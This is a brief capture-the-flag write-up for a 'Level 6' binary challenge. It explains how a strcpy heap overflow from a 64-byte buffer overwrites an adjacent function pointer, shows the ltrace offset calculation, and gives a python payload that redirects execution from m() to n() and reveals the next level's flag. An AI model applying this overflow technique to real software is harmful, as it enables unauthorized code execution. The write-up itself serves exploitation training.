# Level 6
```bash
su level6 #8d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

## Steps
This binary markes one `malloc(64)` then `malloc(4)`. It copies `argv[1]` to the `malloc(64)` using `strcpy`. By default, the address of `m()` is put at the `malloc(4)`. This address will then be executed.

We can try overflowing the `malloc(64)` to the next one, so that we modify the called address. To calculate the offset, we do:

```bash
$ ltrace ./level6
malloc 1 = 0x0804A008
malloc 2 = 0x0804A050
diff = 0x48 # 72 
```

*We replace the call to `m()` by `n()`.*

```bash
$ ./level6 $(python -c "print 72 * 'a' + '\x08\x04\x84\x54'[::-1]")
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
